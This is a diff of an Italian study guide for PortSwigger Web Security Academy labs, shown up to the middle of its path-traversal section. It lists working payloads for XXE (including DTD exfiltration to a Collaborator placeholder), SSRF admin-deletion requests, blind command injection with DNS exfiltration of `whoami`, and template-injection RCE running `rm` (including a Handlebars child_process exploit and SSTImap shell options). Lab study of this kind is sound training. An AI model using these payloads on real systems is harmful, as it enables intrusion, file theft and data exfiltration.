@@ -37,12 +37,12 @@ Nov 15, 2026
 | [Web cache deception](#web-cache-deception--stage-tipico-2) |  | ✓ |  |
 | [Prototype pollution](#prototype-pollution) |  | ✓ | ✓ |
 | [Web LLM attacks](#web-llm-attacks--stage-tipico-2-3) |  | ✓ | ✓ |
+| [Insecure deserialization](#insecure-deserialization--stage-tipico-2-3) |  | ✓ | ✓ |
 | [XXE injection](#xml-external-entity-xxe-injection--stage-tipico-3) |  |  | ✓ |
 | [SSRF](#server-side-request-forgery-ssrf--stage-tipico-3) |  |  | ✓ |
 | [OS command injection](#os-command-injection--stage-tipico-3) |  |  | ✓ |
 | [Server-side template injection](#server-side-template-injection--stage-tipico-3) |  |  | ✓ |
 | [Path traversal](#path-traversal--stage-tipico-3) |  |  | ✓ |
-| [Insecure deserialization](#insecure-deserialization--stage-tipico-3) |  |  | ✓ |
 | [File upload vulnerabilities](#file-upload-vulnerabilities--stage-tipico-3) |  |  | ✓ |
 | [Essential skills](#essential-skills--stage-tipico-1-2-3) | ✓ | ✓ | ✓ |
 
@@ -2630,273 +2630,476 @@ Categorie tipicamente usate per eseguire codice o estrarre dati una volta scalat
 
 ## XML external entity (XXE) injection — Stage tipico: 3
 
-**Come riconoscerla (generale):** l'app accetta/parsa XML lato server (anche nascosto: SVG, DOCX, SOAP, o un content-type modificato in `text/xml`); testa inserendo un `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` e riferendo `&xxe;` in un valore che viene riflesso, oppure punta a un dominio Burp Collaborator per rilevare interazioni out-of-band in caso di XXE cieco.
+**Come riconoscerla (generale):** l'app accetta/parsa XML lato server (anche nascosto: SVG, DOCX, SOAP, o un content-type modificato in `text/xml`); testa inserendo un `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` e riferendo `&xxe;` in un valore riflesso, oppure punta a un dominio Burp Collaborator per rilevare interazioni out-of-band in caso di XXE cieco. Nei lab la funzione vulnerabile è "Check stock" (`POST /product/stock`): inserisci il DOCTYPE tra la dichiarazione XML e l'elemento `<stockCheck>`.
 
-### A. XXE non cieco (fuori scope Practitioner diretto, ma propedeutico) e attack surface nascosta
+### A. Superficie d'attacco: XML non interamente controllato / upload
 
 **1. Sfruttare XInclude per leggere file**
 
-- Segnale: non controlli l'intero documento XML (es. il tuo input viene inserito in una richiesta SOAP lato server), quindi non puoi definire un `DOCTYPE`; controlli solo un singolo valore di dato.
-- Soluzione: usare la sintassi XInclude (che non richiede un DOCTYPE) direttamente nel valore che controlli, per includere il contenuto di un file arbitrario.
-- Payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
+- Segnale: non controlli l'intero documento XML (il tuo input viene inserito in una richiesta XML/SOAP lato server), quindi non puoi definire un `DOCTYPE`; controlli solo un singolo valore (`productId`).
+- Soluzione: usa la sintassi **XInclude** (non richiede un DOCTYPE) nel valore che controlli, per includere un file arbitrario.
+- Payload (nel parametro `productId`):
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
 - Link: [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
 
 **2. XXE via upload di file immagine (SVG)**
 
-- Segnale: l'app accetta upload di immagini e le elabora/valida lato server con una libreria che supporta anche SVG (formato basato su XML), anche se l'app si aspetta solo PNG/JPEG.
-- Soluzione: caricare un file SVG malevolo contenente un DOCTYPE con entità esterna; se l'immagine viene renderizzata/elaborata, il contenuto del file letto può apparire nell'immagine risultante (es. come testo visualizzato).
-- Payload: file `.svg` con `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
+- Segnale: l'app accetta upload di immagini (avatar) ed elabora gli SVG lato server con una libreria basata su XML (Apache Batik), anche se si aspetta PNG/JPEG.
+- Soluzione: carica un SVG malevolo con un DOCTYPE + entità esterna; il contenuto del file letto appare come testo nell'immagine renderizzata. Posta un commento allegando l'SVG come avatar, poi leggi l'hostname nell'immagine.
+- Payload (file `.svg` da caricare):
+```xml
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
 - Link: [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
 
 ### B. Blind XXE — rilevamento e sfruttamento out-of-band
 
 **3. Blind XXE con interazione out-of-band**
 
-- Segnale: l'applicazione non riflette mai il valore dell'entità esterna in risposta; serve un canale di rilevamento esterno (Burp Collaborator).
-- Soluzione: definire un'entità esterna che punta a un dominio Burp Collaborator e usarla in un valore qualsiasi dell'XML; il semplice fatto che il server effettui una richiesta DNS/HTTP verso quel dominio conferma la vulnerabilità, anche senza vedere il contenuto.
-- Payload: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://TUO-SUBDOMAIN.burpcollaborator.net"> ]>` con `&xxe;` in un nodo dati qualsiasi
+- Segnale: l'app non riflette mai il valore dell'entità in risposta; serve un canale esterno (Burp Collaborator).
+- Soluzione: definisci un'entità esterna verso un dominio Collaborator e referenziala in `productId`: la richiesta DNS/HTTP del server conferma la vulnerabilità ("Poll now").
+- Payload — DOCTYPE (tra dichiarazione XML e `<stockCheck>`):
+```xml
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+```
+- Payload — riferimento all'entità (valore di `productId`):
+```xml
+&xxe;
+```
 - Link: [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
 
 **4. Blind XXE con interazione out-of-band via parameter entities XML**
 
-- Segnale: come sopra, ma l'uso di entità "normali" (con `&`) viene bloccato da validazione/hardening del parser.
-- Soluzione: usare invece le **parameter entities** XML (dichiarate e referenziate con `%` invece di `&`), che a volte bypassano i filtri applicati solo alle entità classiche.
-- Payload: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://TUO-SUBDOMAIN.burpcollaborator.net"> %xxe; ]>`
+- Segnale: come sopra, ma le entità "normali" (con `&`) sono bloccate dall'hardening del parser.
+- Soluzione: usa le **parameter entities** (dichiarate e referenziate con `%`), che bypassano i filtri applicati solo alle entità classiche.
+- Payload — DOCTYPE (tra dichiarazione XML e `<stockCheck>`):
+```xml
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+```
 - Link: [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
 
-**5. Sfruttare blind XXE per esfiltrare dati out-of-band (DTD esterno malevolo)**
+**5. Sfruttare blind XXE per esfiltrare dati (DTD esterno malevolo)**
 
-- Segnale: confermata l'interazione out-of-band; vuoi effettivamente esfiltrare il contenuto di un file, non solo rilevare la vulnerabilità.
-- Soluzione: ospitare un DTD malevolo sul proprio server che (1) legge il file target in una parameter entity, (2) costruisce dinamicamente una seconda entità che effettua una richiesta HTTP verso il tuo server includendo quel contenuto nella query string, poi richiamare questo DTD esterno dal payload XXE sulla vittima.
-- Payload DTD ospitato (es. `http://TUO-SERVER/malicious.dtd`): `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://TUO-SERVER/?x=%file;'>">%eval;%exfiltrate;`; payload inviato all'app: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://TUO-SERVER/malicious.dtd"> %xxe;]>`
+- Segnale: confermata l'interazione out-of-band; vuoi esfiltrare il contenuto di un file (`/etc/hostname`), non solo rilevare la vulnerabilità.
+- Soluzione: ospita un DTD malevolo sull'exploit server che legge il file in una parameter entity e costruisce una seconda entità che fa una richiesta HTTP al Collaborator con quel contenuto in query string; richiama il DTD dal payload XXE sulla vittima e leggi l'interazione.
+- Payload — DTD ospitato (exploit server, es. `malicious.dtd`):
+```
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+- Payload — DOCTYPE nella richiesta (sostituisci `YOUR-DTD-URL`):
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
 - Link: [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
 
 **6. Sfruttare blind XXE per leggere dati via messaggi di errore**
 
-- Segnale: l'app restituisce in risposta il messaggio di errore del parser XML (ma non il valore dell'entità direttamente); le connessioni out-of-band potrebbero anche non essere necessarie se gli errori sono visibili.
-- Soluzione: costruire un DTD (esterno, o se possibile tramite i trucchi per DTD interni) che tenta di caricare un file inesistente il cui nome incorpora il contenuto del file target come parameter entity, così l'errore di "file non trovato" include quel contenuto nel messaggio.
-- Payload DTD: `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;` (da richiamare via `SYSTEM` esterno, come nel lab precedente, oppure inline se il parser lo consente)
+- Segnale: non c'è interazione out-of-band utilizzabile, ma l'app restituisce in risposta il messaggio di errore del parser.
+- Soluzione: DTD esterno che carica il file target in una parameter entity e lo usa in un path inesistente → l'errore "file non trovato" contiene il contenuto di `/etc/passwd`.
+- Payload — DTD ospitato (exploit server):
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+- Payload — DOCTYPE nella richiesta (sostituisci `YOUR-DTD-URL`):
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
 - Link: [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
-
 
 ## Server-side request forgery (SSRF) — Stage tipico: 3
 
-**Come riconoscerla (generale):** un parametro contiene un URL (completo o parziale) usato dal server per fare una richiesta HTTP (es. `stockApi=http://...`); provare a sostituirlo con `http://localhost/admin` o un IP interno (`192.168.0.x`); se blind (nessuna risposta visibile), usare un dominio Burp Collaborator per rilevare interazioni out-of-band.
+**Come riconoscerla (generale):** un parametro contiene un URL (completo o parziale) usato dal server per fare una richiesta HTTP (es. `stockApi=http://...` nel "Check stock"); provare a sostituirlo con `http://localhost/admin` o un IP interno; se blind (nessuna risposta visibile), usare un dominio Burp Collaborator per rilevare interazioni out-of-band.
 
 **1. Bypass di filtro blacklist-based**
 
-- Segnale: l'app blocca stringhe come `127.0.0.1`, `localhost` o `/admin`, ma il filtro è basato su blacklist testuale facilmente elusa.
-- Soluzione: usare rappresentazioni alternative dell'IP (decimale, octal, forma abbreviata), un dominio proprio che risolve a `127.0.0.1`, offuscamento con URL-encoding/maiuscole, oppure una URL che reindirizza (redirect) verso il target bloccato.
-- Payload: `stockApi=http://2130706433/admin` oppure `stockApi=http://127.1/admin` oppure un dominio che risolve a `127.0.0.1`
+- Segnale: `stockApi=http://127.0.0.1/` è bloccato; anche `http://127.1/admin` viene bloccato sulla stringa `admin`. Due difese deboli da bypassare.
+- Soluzione: usa la forma abbreviata `127.1` per bypassare il blocco su `127.0.0.1`, poi offusca la `a` di `admin` con **double-URL-encoding** (`a` → `%2561`) per bypassare il blocco su `/admin`. (Alternative all'IP: decimale `2130706433`, un dominio che risolve a `127.0.0.1`.)
+- Payload — bypass del blocco su localhost:
+```
+stockApi=http://127.1/
+```
+- Payload — accesso admin + delete carlos (double-encoding di `a`):
+```
+stockApi=http://127.1/%2561dmin/delete?username=carlos
+```
 - Link: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
 
 **2. Bypass di filtro tramite vulnerabilità di open redirect**
 
-- Segnale: l'URL fornito viene validato strettamente (whitelist di dominio), ma quel dominio consentito contiene a sua volta una funzionalità di redirect aperto, e il client HTTP lato server segue i redirect.
-- Soluzione: fornire come `stockApi` un URL sul dominio consentito che effettua un redirect verso l'host/IP interno desiderato; il filtro valida solo il dominio iniziale, ma la richiesta finale va al target malevolo dopo il redirect.
-- Payload: `stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin` (dove `path` causa un redirect a `192.168.0.68`)
+- Segnale: non puoi far puntare `stockApi` direttamente a un host diverso (ristretto all'app locale), ma `/product/nextProduct?path=...` mette `path` nell'header `Location` di un redirect → open redirect, e il client server-side segue i redirect.
+- Soluzione: passa a `stockApi` un URL dell'app che redirige all'interfaccia admin interna (`192.168.0.12:8080`); il filtro valida il dominio iniziale, ma la richiesta finale segue il redirect fino al target.
+- Payload — raggiungi l'admin via open redirect:
+```
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
+```
+- Payload — delete carlos:
+```
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+```
 - Link: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
 
 **3. Blind SSRF con rilevamento out-of-band**
 
-- Segnale: un header o parametro (es. `Referer`, spesso letto da software di analytics lato server) causa una richiesta server-side ma la risposta non è mai visibile nel frontend.
-- Soluzione: inserire un dominio Burp Collaborator nel parametro/header sospetto e verificare se arriva un'interazione DNS/HTTP; questo conferma la SSRF cieca anche senza poter leggere la risposta.
-- Payload: header `Referer: http://TUO-SUBDOMAIN.burpcollaborator.net`
+- Segnale: un software di analytics lato server fetcha l'URL nell'header `Referer` al caricamento di una pagina prodotto, ma la risposta non è mai visibile nel frontend.
+- Soluzione: metti un dominio Burp Collaborator nell'header `Referer` (click destro → "Insert Collaborator Payload") e verifica l'interazione DNS/HTTP ("Poll now") → conferma la SSRF cieca.
+- Payload — header `Referer`:
+```
+Referer: http://BURP-COLLABORATOR-SUBDOMAIN
+```
 - Link: [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
-
 
 ## OS command injection — Stage tipico: 3
 
-**Come riconoscerla (generale):** un parametro viene passato come argomento a un comando di shell lato server; testa con separatori di comando (`&`, `&&`, `|`, `||`, `;`, newline) seguiti da `echo <stringa-random>` e verifica se la stringa appare in risposta; se non appare (blind), usa time-delay (`ping`) o out-of-band (`nslookup`).
+**Come riconoscerla (generale):** un parametro viene passato come argomento a un comando di shell lato server; testa con separatori di comando (`&`, `&&`, `|`, `||`, `;`, newline) seguiti da `echo <stringa-random>` e verifica se la stringa appare in risposta; se non appare (blind), usa time-delay (`ping`) o out-of-band (`nslookup`). Nei lab la funzione vulnerabile è il form di **feedback**, parametro `email` (i `+` nei payload sono spazi URL-encoded nel body).
 
 **1. Blind OS command injection con time delay**
 
 - Segnale: l'output del comando non è mai riflesso in risposta; serve confermare l'esecuzione tramite un ritardo osservabile.
-- Soluzione: iniettare un comando `ping` con un numero di pacchetti che causa un ritardo misurabile nella risposta HTTP.
-- Payload: `& ping -c 10 127.0.0.1 &`
+- Soluzione: inietta un `ping -c 10` che causa ~10s di ritardo nella risposta HTTP.
+- Payload (parametro `email`):
+```
+email=x||ping+-c+10+127.0.0.1||
+```
 - Link: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
 
 **2. Blind OS command injection con redirezione dell'output**
 
-- Segnale: l'app serve risorse statiche da una directory nota del filesystem (es. `/var/www/static`); vuoi recuperare l'output di un comando senza un canale out-of-band.
-- Soluzione: reindirizzare l'output del comando iniettato in un file dentro la webroot, poi recuperarlo visitando l'URL corrispondente nel browser.
-- Payload: `& whoami > /var/www/static/whoami.txt &`, poi visitare `https://TARGET/whoami.txt`
+- Segnale: nessun output riflesso, ma c'è una cartella scrivibile servita dall'app: `/var/www/images/` (da cui carica le immagini del catalogo).
+- Soluzione: redirigi l'output del comando in un file dentro quella cartella, poi recuperalo tramite il parametro `filename` del caricamento immagine.
+- Payload — esegui e scrivi l'output (parametro `email`):
+```
+email=||whoami>/var/www/images/output.txt||
+```
+- Payload — leggi l'output (parametro `filename` del caricamento immagine):
+```
+filename=output.txt
+```
 - Link: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
 
 **3. Blind OS command injection con interazione out-of-band**
 
-- Segnale: nessun output riflesso e nessuna directory statica nota in cui scrivere; serve un canale OAST per confermare l'esecuzione.
-- Soluzione: iniettare un comando che causa una query DNS verso un dominio Burp Collaborator; l'arrivo della lookup conferma l'injection.
-- Payload: `& nslookup kgji2ohoyw.burpcollaborator.net &`
+- Segnale: comando eseguito in modo asincrono, nessun output e nessuna directory scrivibile accessibile; serve un canale OAST.
+- Soluzione: inietta un `nslookup` verso un dominio Burp Collaborator (click destro → "Insert Collaborator payload"); l'arrivo della lookup DNS conferma l'injection ("Poll now").
+- Payload (parametro `email`):
+```
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+```
 - Link: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
 
 **4. Blind OS command injection con esfiltrazione dati out-of-band**
 
-- Segnale: come sopra, ma vuoi anche esfiltrare l'output di un comando (es. `whoami`), non solo confermare l'esecuzione.
-- Soluzione: incorporare l'output del comando (tramite command substitution) come sottodominio della query DNS verso il proprio Collaborator; il valore compare nel log delle interazioni DNS.
-- Payload: ``& nslookup `whoami`.kgji2ohoyw.burpcollaborator.net &``
+- Segnale: come sopra, ma vuoi anche esfiltrare l'output di un comando (`whoami`), non solo confermare l'esecuzione.
+- Soluzione: incorpora l'output del comando (command substitution con backtick) come sottodominio della query DNS verso il Collaborator; il valore compare nel full domain name dell'interazione DNS (tab Description). Inserisci quel nome utente per risolvere.
+- Payload (parametro `email`):
+```
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+```
 - Link: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
-
 
 ## Server-side template injection — Stage tipico: 3
 
-**Come riconoscerla (generale):** input utente viene concatenato (non passato come dato) dentro un template; fuzzing con caratteri speciali `${{<%[%'"}}%\` per causare un errore; in contesto plaintext testare operazioni matematiche (`${7*7}` → se risulta `49` è SSTI); in contesto codice (es. `greeting=data.username`) provare a rompere l'espressione con `}}<tag>` e vedere se l'HTML iniettato viene renderizzato.
+**Come riconoscerla (generale):** input utente concatenato (non passato come dato) dentro un template; fuzzing con `${{<%[%'"}}%\` per causare un errore che spesso rivela il motore; in contesto plaintext testa operazioni matematiche (`${7*7}`/`<%= 7*7 %>`/`{{7*7}}` → se risulta `49` è SSTI); in contesto codice (il parametro è dentro un'espressione, es. `user.name`) rompi l'espressione con `}}{{7*7}}` e vedi se viene valutata. Identificato il motore, usa la sua documentazione per RCE/lettura dati.
 
-**1. SSTI di base (contesto plaintext)**
+**Approfondimento — SSTImap** (successore di tplmap): `sstimap.py -u 'URL'` rileva automaticamente motore e parametro iniettabile; poi azioni: `--os-cmd 'cmd'` (comando singolo), `--os-shell` (shell OS), `--eval-cmd`/`--tpl-cmd` (codice nel linguaggio base/template), `-i` (modalità interattiva), `--upload`/`--download` (file). Supporta molti motori (ERB, Freemarker, Handlebars, Jinja2, Twig, Tornado, Velocity…). Per target POST/autenticati devi passare body e cookie: i flag esatti non sono documentati nel README, verificali con `sstimap.py -h` sulla tua versione.
 
-- Segnale: un parametro viene renderizzato come testo libero nel template; un'espressione matematica come `${7*7}` produce `49` nell'output.
-- Soluzione: identificare il motore di template (es. Freemarker, Twig, Velocity) tramite la sintassi che produce un risultato valido, poi iniettare un payload di RCE nativo di quel motore.
-- Payload (Freemarker): `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+**1. SSTI di base (ERB, contesto plaintext)**
+
+- Segnale: `GET /?message=...` renderizza il valore; `<%= 7*7 %>` produce `49` → ERB (Ruby).
+- Soluzione: usa `system()` di Ruby per eseguire comandi OS. Inietta nel parametro `message` (URL-encoded).
+- Payload — conferma / RCE (valore di `message`, poi URL-encoded):
+```
+<%= system("rm /home/carlos/morale.txt") %>
+```
+- Payload — URL completo (URL-encoded):
+```
+https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
+```
+- SSTImap:
+```
+sstimap.py -u 'https://YOUR-LAB-ID.web-security-academy.net/?message=test' --os-cmd 'rm /home/carlos/morale.txt'
+```
+- Link: [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
+
+**2. SSTI di base (Tornado, contesto codice)**
+
+- Segnale: `POST /my-account/change-blog-post-author-display` imposta `blog-post-author-display` a `user.name`/`user.first_name`/`user.nickname`, inserito in un'espressione del template; `user.name}}{{7*7}}` mostra `49}}` nel nome sopra il commento → Tornado.
+- Soluzione: esci dall'espressione, importa `os` ed esegui `os.system()`. Ricarica la pagina del commento per far renderizzare il template.
+- Payload — valore del parametro (URL-encoded):
+```
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+```
+- Payload — forma leggibile (prima dell'URL-encoding):
+```
+user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
+```
+- Link: [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
+
+**3. SSTI sfruttata leggendo la documentazione (Freemarker)**
+
+- Segnale: autenticato come `content-manager`, editi un template di descrizione prodotto che usa `${...}`; `${foobar}` genera un errore che rivela **Freemarker**.
+- Soluzione: dalla doc Freemarker, il built-in `?new()` permette di istanziare `freemarker.template.utility.Execute` (classe che implementa `TemplateModel`) per eseguire comandi shell.
+- Payload (nel template del prodotto):
+```
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+```
 - Link: [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
 
-**2. SSTI di base (contesto codice)**
+**4. SSTI in un linguaggio sconosciuto con exploit documentato (Handlebars)**
 
-- Segnale: il parametro viene inserito dentro un'espressione del template (es. `{{` + parametro + `}}`), non nel testo libero; iniettando `}}<tag>` l'HTML successivo viene renderizzato, confermando che sei dentro l'espressione.
-- Soluzione: chiudere l'espressione esistente e iniettare una nuova espressione malevola subito dopo.
-- Payload: `{% raw %}{{` + `}}<tag>{% endraw %}` adattato — es. `}}{{7*7}}` per confermare, poi sostituire con il payload RCE del motore identificato
+- Segnale: `GET /?message=...`; il fuzz `${{<%[%'"}}%\` genera un errore che identifica **Handlebars**.
+- Soluzione: usa l'exploit Handlebars noto (@Zombiehelp54) adattato per chiamare `require('child_process').exec(...)`; URL-encoda tutto il payload nel parametro `message`.
+- Payload — exploit Handlebars (forma leggibile; poi URL-encoda in `message`):
+```handlebars
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+```
+- SSTImap:
+```
+sstimap.py -u 'https://YOUR-LAB-ID.web-security-academy.net/?message=test' --os-cmd 'rm /home/carlos/morale.txt'
+```
 - Link: [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 
-**3. SSTI sfruttata leggendo la documentazione del motore**
+**5. SSTI con information disclosure via oggetti forniti (Django)**
 
-- Segnale: identificato il motore (es. ERB) ma non conosci a memoria le API pericolose; la documentazione ufficiale elenca oggetti/metodi con warning di sicurezza (lettura file, listing directory).
-- Soluzione: consultare la documentazione del motore per trovare funzioni built-in pericolose documentate e usarle per leggere file arbitrari.
-- Payload (ERB): `<%= File.open('/path/to/file').read %>` oppure `<%= Dir.entries('/') %>`
+- Segnale: autenticato come `content-manager`, editi un template; il fuzz `${{<%[%'"}}%\` genera un errore che rivela **Django** (sintassi non eval-based → niente RCE diretta).
+- Soluzione: usa il tag built-in `{% debug %}` per elencare gli oggetti accessibili (incluso `settings`), poi leggi `settings.SECRET_KEY` e invialo come soluzione.
+- Payload — enumerazione oggetti:
+```
+{% debug %}
+```
+- Payload — leak della secret key:
+```
+{{settings.SECRET_KEY}}
+```
 - Link: [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
-
-**4. SSTI in un linguaggio sconosciuto con exploit documentato online**
-
-- Segnale: identificato un motore di template non comune/raro; non hai esperienza diretta con la sua sintassi.
-- Soluzione: cercare online exploit PoC già pubblicati per quel motore specifico (spesso presenti in writeup, cheat sheet, repository di payload) e adattarli al contesto del target.
-- Payload: dipende dal motore trovato tramite ricerca (es. motori meno comuni spesso hanno PoC pubblici di RCE)
-- Link: [Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
-
-**5. SSTI con information disclosure via oggetti forniti dallo sviluppatore**
-
-- Segnale: l'RCE diretta non è praticabile (sandboxing), ma il template ha accesso a oggetti custom specifici del sito (non built-in del motore), che potrebbero esporre funzionalità non documentate.
-- Soluzione: esplorare manualmente gli oggetti disponibili nell'ambiente (namespace "self"/"environment") per trovare metodi exploitabili su oggetti custom, ad esempio per leggere file tramite path traversal su un oggetto che gestisce risorse del sito.
-- Payload: es. `${object.getClass()...}` o enumerazione di metodi su un oggetto custom come `${myObject.readFile('/etc/passwd')}` (dipende dall'oggetto specifico esposto dall'app)
-- Link: [Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)
-
 
 ## Path traversal — Stage tipico: 3
 
-**Come riconoscerla (generale):** un parametro contiene un nome file che viene concatenato a un path base lato server per leggere/scrivere file (es. `filename=218.png` in `/loadImage?filename=...`); testare con `../../../etc/passwd` e varianti se la sequenza viene filtrata.
+**Come riconoscerla (generale):** un parametro contiene un nome file concatenato a un path base lato server per leggere file (es. `filename=218.png`); testa con `../../../etc/passwd` e varianti se la sequenza viene filtrata. Nei lab la richiesta è quella che carica l'immagine del prodotto, parametro `filename`.
 
 **1. Bypass con path assoluto (sequenze di traversal bloccate)**
 
-- Segnale: l'app blocca/strips le sequenze `../`, ma non valida se il filename è un path assoluto.
-- Soluzione: fornire direttamente il path assoluto del file, senza alcuna sequenza di traversal.
-- Payload: `filename=/etc/passwd`
+- Segnale: l'app blocca/strippa `../`, ma non valida se il filename è un path assoluto.
+- Soluzione: fornisci direttamente il path assoluto, senza sequenze di traversal.
+- Payload (parametro `filename`):
+```
+/etc/passwd
+```
 - Link: [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
 
-**2. Bypass con sequenze di traversal annidate (stripping non ricorsivo)**
+**2. Bypass con sequenze annidate (stripping non ricorsivo)**
 
-- Segnale: l'app rimuove `../` ma lo fa con una sola passata (non ricorsiva), quindi rimuovendo la sottostringa interna rimane una sequenza valida.
-- Soluzione: usare sequenze annidate che, dopo la rimozione della sequenza interna, ricompongono `../`.
-- Payload: `filename=....//....//....//etc/passwd` (o `....\/....\/`)
+- Segnale: l'app rimuove `../` ma con una sola passata (non ricorsiva), quindi togliendo la sottostringa interna rimane una sequenza valida.
+- Soluzione: usa sequenze annidate che, dopo la rimozione interna, ricompongono `../`.
+- Payload (parametro `filename`):
+```
+....//....//....//etc/passwd
+```
 - Link: [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
 
 **3. Bypass con URL-decode superfluo (doppio URL-encoding)**
 
-- Segnale: il filtro anti-traversal agisce prima di un URL-decode, oppure decodifica una sola volta mentre il parsing successivo decodifica di nuovo.
-- Soluzione: URL-encodare (o doppio URL-encodare) le sequenze `../` per bypassare il filtro testuale.
-- Payload: `filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` oppure doppio encoding `%252e%252e%252f`
+- Segnale: l'app blocca le sequenze di traversal, poi esegue un URL-decode **ulteriore** dell'input già decodificato → doppio encoding bypassa il filtro.
+- Soluzione: doppio URL-encoding di `../` (`/` → `%252f`).
+- Payload (parametro `filename`):
+```
+..%252f..%252f..%252fetc/passwd
+```
 - Link: [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
 
 **4. Bypass di validazione sull'inizio del path**
 
-- Segnale: l'app richiede che il filename inizi con una cartella base attesa (es. `/var/www/images`).
